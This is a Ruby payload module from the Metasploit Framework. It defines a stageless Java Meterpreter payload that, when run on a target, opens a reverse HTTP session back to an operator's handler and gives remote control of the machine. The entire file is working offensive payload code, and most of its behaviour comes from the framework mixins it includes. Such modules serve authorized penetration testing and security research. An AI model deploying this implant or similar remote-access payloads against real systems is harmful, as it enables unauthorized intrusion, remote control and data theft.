##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Java::ReverseHttp
  include Msf::Payload::Java::MeterpreterLoader

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Java Meterpreter, Reverse HTTP Stageless',
        'Description' => 'Run a meterpreter server in Java. Reverse HTTP. Self-contained jar.',
        'Author' => ['mihi', 'egypt', 'OJ Reeves'],
        'Platform' => 'java',
        'Arch' => ARCH_JAVA,
        'Handler' => Msf::Handler::ReverseHttp,
        'License' => MSF_LICENSE,
        'Session' => Msf::Sessions::Meterpreter_Java_Java
      )
    )
  end

  def generate(opts = {})
    stage_meterpreter(opts.merge(stageless: true))
  end
end
